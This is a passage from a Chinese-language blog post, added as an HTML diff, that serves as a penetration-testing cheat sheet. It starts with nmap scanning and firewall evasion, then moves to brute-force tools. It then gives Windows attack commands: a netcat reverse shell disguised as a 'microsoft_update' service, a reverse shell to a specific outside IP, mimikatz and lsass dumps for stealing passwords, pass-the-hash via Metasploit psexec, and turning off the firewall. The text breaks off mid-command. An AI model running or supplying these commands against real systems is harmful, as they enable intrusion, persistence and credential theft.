@@ -1,0 +1,1140 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="渗透,">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">
+
+
+
+
+
+
+<meta name="description" content="NMAP扫描策略适用所有大小网络最好的nmap扫描策略主机发现，生成存活主机列表12$ nmap -sn -T4 -oG Discovery.gnamp 192.168.56.0/24$ grep &quot;Status:Up&quot; Discovery.gnmap | cut -f 2 -d &apos; &apos; &amp;gt;LiveHosts.txt 端口发现，发现大部分常用端口123$nmap -sS -T4 -Pn -o">
+<meta name="keywords" content="渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透技术一">
+<meta property="og:url" content="https://youandme66.github.io/2017/01/04/first/index.html">
+<meta property="og:site_name" content="战马博客">
+<meta property="og:description" content="NMAP扫描策略适用所有大小网络最好的nmap扫描策略主机发现，生成存活主机列表12$ nmap -sn -T4 -oG Discovery.gnamp 192.168.56.0/24$ grep &quot;Status:Up&quot; Discovery.gnmap | cut -f 2 -d &apos; &apos; &amp;gt;LiveHosts.txt 端口发现，发现大部分常用端口123$nmap -sS -T4 -Pn -o">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2017-01-03T16:21:38.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="渗透技术一">
+<meta name="twitter:description" content="NMAP扫描策略适用所有大小网络最好的nmap扫描策略主机发现，生成存活主机列表12$ nmap -sn -T4 -oG Discovery.gnamp 192.168.56.0/24$ grep &quot;Status:Up&quot; Discovery.gnmap | cut -f 2 -d &apos; &apos; &amp;gt;LiveHosts.txt 端口发现，发现大部分常用端口123$nmap -sS -T4 -Pn -o">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'youandme'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://youandme66.github.io/2017/01/04/first/">
+
+
+
+
+
+  <title> 渗透技术一 | 战马博客 </title>
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">战马博客</span>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+  <p class="site-subtitle"></p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup">
+ <span class="search-icon fa fa-search"></span>
+ <input type="text" id="local-search-input">
+ <div id="local-search-result"></div>
+ <span class="popup-btn-close">close</span>
+</div>
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope="" itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="https://youandme66.github.io/2017/01/04/first/">
+
+  <span style="display:none" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="刘志豪">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/uploads/avatar.jpg">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="战马博客">
+    <span style="display:none" itemprop="logo" itemscope="" itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="战马博客" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                渗透技术一
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-04T00:00:00+08:00">
+                2017-01-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+              <span class="post-meta-divider">|</span>
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/Hack/" itemprop="url" rel="index">
+                    <span itemprop="name">Hack</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            <!--noindex-->
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                  <a href="/2017/01/04/first/#comments" itemprop="discussionUrl">
+                    <span class="post-comments-count hc-comment-count" data-xid="2017/01/04/first/" itemprop="commentsCount"></span>
+                  </a>
+                </span>
+              </span>
+              <!--/noindex-->
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/01/04/first/" class="leancloud_visitors" data-flag-title="渗透技术一">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               <span class="post-meta-item-text">阅读次数 </span>
+               <span class="leancloud-visitors-count"></span>
+              </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="NMAP扫描策略"><a href="#NMAP扫描策略" class="headerlink" title="NMAP扫描策略"></a>NMAP扫描策略</h3><p>适用所有大小网络最好的nmap扫描策略<br>主机发现，生成存活主机列表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sn -T4 -oG Discovery.gnamp 192.168.56.0/24</span><br><span class="line">$ grep <span class="string">"Status:Up"</span> Discovery.gnmap | cut -f 2 -d <span class="string">' '</span> &gt;LiveHosts.txt</span><br></pre></td></tr></table></figure></p>
+<p>端口发现，发现大部分常用端口<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt</span><br><span class="line"><span class="variable">$nmap</span> -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt</span><br><span class="line"><span class="variable">$nmap</span> -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt</span><br></pre></td></tr></table></figure></p>
+<p>端口发现，发现全部端口，但UDP端口的扫描会非常慢<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$nmap</span> -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt</span><br><span class="line"><span class="variable">$nmap</span> -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt</span><br></pre></td></tr></table></figure></p>
+<p>显示TCP\UDP端口<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$grep</span> <span class="string">"open"</span> FullTCP|cut -f 1 -d <span class="string">' '</span>|sort -nu | cut -f 1 -d <span class="string">'/'</span>|xargs | sed <span class="string">'s/ /,/g'</span>|awk <span class="string">'&#123;print "T:"$0&#125;'</span></span><br><span class="line"><span class="variable">$grep</span> <span class="string">"open"</span> FullUDP|cut -f 1 -d <span class="string">' '</span> | sort -nu | cut -f 1 -d <span class="string">'/'</span> |xargs | sed <span class="string">'s/ /,/g'</span>|awk <span class="string">'&#123;print "U:"$0&#125;'</span></span><br></pre></td></tr></table></figure></p>
+<p>侦测服务版本<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt</span><br></pre></td></tr></table></figure></p>
+<p>扫描系统<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt</span><br></pre></td></tr></table></figure></p>
+<p>系统和服务检测<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt</span><br></pre></td></tr></table></figure></p>
+<h3 id="Nmap躲避防火墙"><a href="#Nmap躲避防火墙" class="headerlink" title="Nmap躲避防火墙"></a>Nmap躲避防火墙</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#分段</span></span><br><span class="line"><span class="variable">$nmap</span> -f</span><br><span class="line"><span class="comment">#修改默认MTU大小，但必须为8的倍数(8,16,24,32等等)</span></span><br><span class="line"><span class="variable">$nmap</span> --mtu 24</span><br><span class="line"><span class="comment">#生成随机数量的欺骗</span></span><br><span class="line"><span class="variable">$nmap</span> -D RND:10 [target]</span><br><span class="line"><span class="comment">#手动指定欺骗使用的IP</span></span><br><span class="line"><span class="variable">$nmap</span> -D decoy1,decoy2,decoy3 etc</span><br><span class="line"><span class="comment">#僵尸网络扫描，首先需要找到僵尸网络的IP</span></span><br><span class="line"><span class="variable">$nmap</span> -sI [Zombie IP] [Target IP]</span><br><span class="line"><span class="comment">#指定源端口号</span></span><br><span class="line"><span class="variable">$nmap</span> --<span class="built_in">source</span>-port 80 IP</span><br><span class="line"><span class="comment">#在每个扫描数据包后追加随机数量的数据</span></span><br><span class="line"><span class="variable">$nmap</span> --data-length 25 IP</span><br><span class="line"><span class="comment">#MAC地址欺骗，可以生成不同主机的MAC地址</span></span><br><span class="line"><span class="variable">$nmap</span> --spoof-mac Dell/Apple/3Com IP</span><br></pre></td></tr></table></figure>
+<h3 id="Nmap进行Web漏洞扫描"><a href="#Nmap进行Web漏洞扫描" class="headerlink" title="Nmap进行Web漏洞扫描"></a>Nmap进行Web漏洞扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cd</span> /usr/share/nmap/scripts/</span><br><span class="line"><span class="variable">$wget</span> http://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz</span><br><span class="line"><span class="variable">$nmap</span> -sS -sV --script=vulscan/vulscan.nse target</span><br><span class="line"><span class="variable">$nmap</span> -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target</span><br><span class="line"><span class="variable">$nmap</span> -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target</span><br><span class="line"><span class="variable">$nmap</span> -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target</span><br><span class="line"><span class="variable">$nmap</span> -sV --script=vuln target</span><br><span class="line"><span class="variable">$nmap</span> -PN -sS -sV --script=all –script-args vulscancorrelation=1 target</span><br></pre></td></tr></table></figure>
+<h3 id="使用DIRB爆破目录"><a href="#使用DIRB爆破目录" class="headerlink" title="使用DIRB爆破目录"></a>使用DIRB爆破目录</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://IP:PORT /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure>
+<h3 id="Patator全能暴力破解测试工具"><a href="#Patator全能暴力破解测试工具" class="headerlink" title="Patator全能暴力破解测试工具"></a>Patator全能暴力破解测试工具</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># git clone https://github.com/lanjelot/patator.git /usr/share/patator</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># SMTP 爆破</span></span><br><span class="line">$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst</span><br><span class="line">$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst</span><br><span class="line">$ patator smtp_login host=192.168.17.129 helo=<span class="string">'ehlo 192.168.17.128'</span> user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst</span><br><span class="line">$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=<span class="string">'incorrect password or account name'</span></span><br></pre></td></tr></table></figure>
+<h3 id="使用Fierce爆破DNS"><a href="#使用Fierce爆破DNS" class="headerlink" title="使用Fierce爆破DNS"></a>使用Fierce爆破DNS</h3><p>注：Fierce 会检查 DNS 服务器是否允许区域传送。如果允许，就会进行区域传送并通知用户，如果不允许，则可以通过查询 DNS 服务器枚举主机名。类似工具：subDomainsBrute 和 SubBrute 等等<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://ha.ckers.org/fierce/</span></span><br><span class="line">$ ./fierce.pl -dns example.com</span><br><span class="line">$ ./fierce.pl –dns example.com –wordlist myWordList.txt</span><br></pre></td></tr></table></figure></p>
+<h3 id="使用Nikto扫描web服务"><a href="#使用Nikto扫描web服务" class="headerlink" title="使用Nikto扫描web服务"></a>使用Nikto扫描web服务</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -C all -h http://IP</span><br></pre></td></tr></table></figure>
+<p>扫描workpress<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/wpscanteam/wpscan.git &amp;&amp; <span class="built_in">cd</span> wpscan</span><br><span class="line">./wpscan –url http://IP/ –enumerate p</span><br></pre></td></tr></table></figure></p>
+<h3 id="HTTP指纹识别"><a href="#HTTP指纹识别" class="headerlink" title="HTTP指纹识别"></a>HTTP指纹识别</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.net-square.com/_assets/httprint_linux_301.zip &amp;&amp; unzip httprint_linux_301.zip</span><br><span class="line"><span class="built_in">cd</span> httprint_301/linux/</span><br><span class="line">./httprint -h http://IP -s signatures.txt</span><br></pre></td></tr></table></figure>
+<h3 id="使用Skipfish扫描"><a href="#使用Skipfish扫描" class="headerlink" title="使用Skipfish扫描"></a>使用Skipfish扫描</h3><p>注：Skipfish 是一款 Web 应用安全侦查工具，Skipfish 会利用递归爬虫和基于字典的探针生成一幅交互式网站地图，最终生成的地图会在通过安全检查后输出。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP</span><br></pre></td></tr></table></figure></p>
+<h3 id="使用NC扫描"><a href="#使用NC扫描" class="headerlink" title="使用NC扫描"></a>使用NC扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -v -w 1 target -z 1-1000</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> &#123;101..102&#125;; <span class="keyword">do</span> nc -vv -n -w 1 192.168.56.<span class="variable">$i</span> 21-25 -z; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<h3 id="Unicornscan"><a href="#Unicornscan" class="headerlink" title="Unicornscan"></a>Unicornscan</h3><p>Unicornscan 是一个信息收集和安全审计的工具。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">us -H -msf -Iv 192.168.56.101 -p 1-65535</span><br><span class="line">us -H -mU -Iv 192.168.56.101 -p 1-65535</span><br><span class="line"></span><br><span class="line">-H 在生成报告阶段解析主机名</span><br><span class="line">-m 扫描类型 (sf - tcp, U - udp)</span><br><span class="line">-Iv - 详细</span><br></pre></td></tr></table></figure></p>
+<h3 id="使用Xprobe2识别操作系统指纹"><a href="#使用Xprobe2识别操作系统指纹" class="headerlink" title="使用Xprobe2识别操作系统指纹"></a>使用Xprobe2识别操作系统指纹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xprobe2 -v -p tcp:80:open IP</span><br></pre></td></tr></table></figure>
+<h3 id="枚举Samba"><a href="#枚举Samba" class="headerlink" title="枚举Samba"></a>枚举Samba</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nmblookup -A target</span><br><span class="line">smbclient //MOUNT/share -I target -N</span><br><span class="line">rpcclient -U <span class="string">""</span> target</span><br><span class="line">enum4linux target</span><br></pre></td></tr></table></figure>
+<h3 id="枚举SNMP"><a href="#枚举SNMP" class="headerlink" title="枚举SNMP"></a>枚举SNMP</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snmpget -v 1 -c public IP</span><br><span class="line">snmpwalk -v 1 -c public IP</span><br><span class="line">snmpbulkwalk -v2c -c public -Cn0 -Cr10 IP</span><br></pre></td></tr></table></figure>
+<h3 id="实用windows-cmd-命令"><a href="#实用windows-cmd-命令" class="headerlink" title="实用windows cmd 命令"></a>实用windows cmd 命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Users</span><br><span class="line">net localgroup Administrators</span><br><span class="line">search dir/s *.doc</span><br><span class="line">system(<span class="string">"start cmd.exe /k <span class="variable">$cmd</span>"</span>)</span><br><span class="line">sc create microsoft_update binpath=<span class="string">"cmd /K start c:\nc.exe -d ip-of-hacker port -e cmd.exe"</span> start= auto error= ignore</span><br><span class="line">/c C:\nc.exe -e c:\windows\system32\cmd.exe -vv 23.92.17.103 7779</span><br><span class="line">mimikatz.exe <span class="string">"privilege::debug"</span> <span class="string">"log"</span> <span class="string">"sekurlsa::logonpasswords"</span></span><br><span class="line">Procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe <span class="string">"sekurlsa::minidump lsass.dmp"</span> <span class="string">"log"</span> <span class="string">"sekurlsa::logonpasswords"</span></span><br><span class="line">C:\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp 32 位系统</span><br><span class="line">C:\temp\procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp 64 位系统</span><br></pre></td></tr></table></figure>
+<h3 id="PuTTY连接隧道"><a href="#PuTTY连接隧道" class="headerlink" title="PuTTY连接隧道"></a>PuTTY连接隧道</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">转发远程端口到目标地址</span><br><span class="line">plink.exe -P 22 -l root -pw <span class="string">"1234"</span> -R 445:127.0.0.1:445 IP</span><br></pre></td></tr></table></figure>
+<p>Meterpreter端口转发<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://www.offensive-security.com/metasploit-unleashed/portfwd/</span></span><br><span class="line"><span class="comment"># 转发远程端口到目标地址</span></span><br><span class="line">meterpreter &gt; portfwd add –l 3389 –p 3389 –r 172.16.194.141</span><br><span class="line">kali &gt; rdesktop 127.0.0.1:3389</span><br></pre></td></tr></table></figure></p>
+<p>开启RDP服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">"hklm\system\currentcontrolset\control\terminal server"</span> /f /v fDenyTSConnections /t REG_DWORD /d 0</span><br><span class="line">netsh firewall <span class="built_in">set</span> service remoteadmin <span class="built_in">enable</span></span><br><span class="line">netsh firewall <span class="built_in">set</span> service remotedesktop <span class="built_in">enable</span></span><br></pre></td></tr></table></figure></p>
+<p>关闭windows防火墙<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall <span class="built_in">set</span> opmode <span class="built_in">disable</span></span><br></pre></td></tr></table></figure></p>
+<p>Meterpreter VNC/RDP<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/</span></span><br><span class="line">run getgui -u admin -p 1234</span><br><span class="line">run vnc -p 5043</span><br></pre></td></tr></table></figure></p>
+<h3 id="使用Mimikatz"><a href="#使用Mimikatz" class="headerlink" title="使用Mimikatz"></a>使用Mimikatz</h3><p>获取 Windows 明文用户名密码<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/gentilkiwi/mimikatz.git</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure></p>
+<h3 id="获取哈希值"><a href="#获取哈希值" class="headerlink" title="获取哈希值"></a>获取哈希值</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/byt3bl33d3r/pth-toolkit</span><br><span class="line">pth-winexe -U <span class="built_in">hash</span> //IP cmd</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line">apt-get install freerdp-x11</span><br><span class="line">xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP</span><br><span class="line"></span><br><span class="line">在或者</span><br><span class="line"></span><br><span class="line">meterpreter &gt; run post/windows/gather/hashdump</span><br><span class="line">Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::</span><br><span class="line">msf &gt; use exploit/windows/smb/psexec</span><br><span class="line">msf exploit(psexec) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(psexec) &gt; <span class="built_in">set</span> SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c</span><br><span class="line">msf exploit(psexec) &gt; exploit</span><br><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure>
+<h3 id="使用Hashcat破解密码"><a href="#使用Hashcat破解密码" class="headerlink" title="使用Hashcat破解密码"></a>使用Hashcat破解密码</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 400 -a 0 <span class="built_in">hash</span> /root/rockyou.txt</span><br></pre></td></tr></table></figure>
+<h3 id="使用NC在windows上反弹shell"><a href="#使用NC在windows上反弹shell" class="headerlink" title="使用NC在windows上反弹shell"></a>使用NC在windows上反弹shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c:&gt;nc -Lp 31337 -vv -e cmd.exe</span><br><span class="line">nc 192.168.0.10 31337</span><br><span class="line">c:&gt;nc example.com 80 -e cmd.exe</span><br><span class="line">nc -lp 80</span><br><span class="line"></span><br><span class="line">nc -lp 31337 -e /bin/bash</span><br><span class="line">nc 192.168.0.10 31337</span><br><span class="line">nc -vv -r(random) -w(<span class="built_in">wait</span>) 1 192.168.0.10 -z(i/o error) 1-1000</span><br></pre></td></tr></table></figure>
+<h3 id="查找SUID-SGID-root文件"><a href="#查找SUID-SGID-root文件" class="headerlink" title="查找SUID\SGID root文件"></a>查找SUID\SGID root文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查找 SUID root 文件</span></span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找 SGID root 文件:</span></span><br><span class="line">find / -group root -perm -2000 -<span class="built_in">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找 SUID 和 SGID 文件:</span></span><br><span class="line">find / -perm 